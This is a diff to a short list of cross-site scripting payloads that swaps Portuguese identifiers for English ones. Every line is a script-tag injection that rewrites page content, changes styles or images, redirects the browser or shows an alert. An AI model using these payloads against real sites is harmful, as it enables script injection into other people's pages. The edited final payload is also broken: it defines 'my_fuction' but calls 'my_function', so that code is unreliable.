@@ -6,16 +6,16 @@ xss 2.0 payloads
 
 <script>document.querySelector('#ID-ELEMENT').textContent ='xss'</script>
 
-<script>document.getElementById('meu-elemento').textContent = 'new content';</script>
+<script>document.getElementById('my-element').textContent = 'new content';</script>
 
 <script> var novoElemento = document.createElement('p');novoElemento.textContent = 'xss';document.body.appendChild(novoElemento);</script>
 
-<script>document.getElementById('meu-elemento').style.color ='red';</script>
+<script>document.getElementById('my-element').style.color ='red';</script>
 
 <script>window.location.href = 'https://www.example.com';</script>
 
-<script>document.querySelector('img').src = 'nova-imagem.jpg';</script>
+<script>document.querySelector('img').src = 'new-imagem.jpg';</script>
 
-<script>document.getElementById('my-element').classList.add('destaque');</script>
+<script>document.getElementById('my-element').classList.add('highlight');</script>
 
-<script>function minhaFuncao() { alert('Executando minha função!');}minhaFuncao();</script>
+<script>function my_fuction() { alert('Executing my fuction');}my_function();</script>
